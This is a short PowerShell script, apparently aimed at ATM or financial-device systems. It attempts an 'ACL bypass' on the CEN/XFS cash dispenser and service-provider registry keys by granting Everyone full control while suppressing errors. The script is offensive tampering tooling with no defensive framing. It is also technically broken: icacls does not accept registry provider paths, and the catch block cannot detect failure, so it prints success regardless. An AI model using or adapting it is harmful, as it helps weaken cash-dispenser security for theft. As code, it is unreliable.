$registryPaths = @(
    "HKLM\SOFTWARE\XFS\DISPENSER",
    "HKLM\SOFTWARE\WOW6432Node\XFS\DISPENSER",
    "HKLM\SOFTWARE\XFS\SP-Drivers",
    "HKLM\SOFTWARE\WOW6432Node\XFS\SP-Drivers",
    "HKLM\SOFTWARE\XFS",
    "HKLM\SOFTWARE\WOW6432Node\XFS"
)

foreach ($path in $registryPaths) {
    try {
        Write-Host "🔐 Attempting ACL bypass for: $path" -ForegroundColor Yellow

        # First, export the key in case you need to restore later
        $safePath = $path -replace '\\', '_'
        $exportFile = "$env:TEMP\Backup_$safePath.reg"
        reg.exe export $path $exportFile > $null 2>&1

        # Use regini or icacls depending on system
        $key = $path -replace "HKLM\\", "HKEY_LOCAL_MACHINE\"
        icacls "Registry::$key" /grant Everyone:F /t > $null 2>&1

        Write-Host "✅ ACL changed for: $path" -ForegroundColor Green
    } catch {
        Write-Host "❌ Failed to change ACL for $path: $_" -ForegroundColor Red
    }
}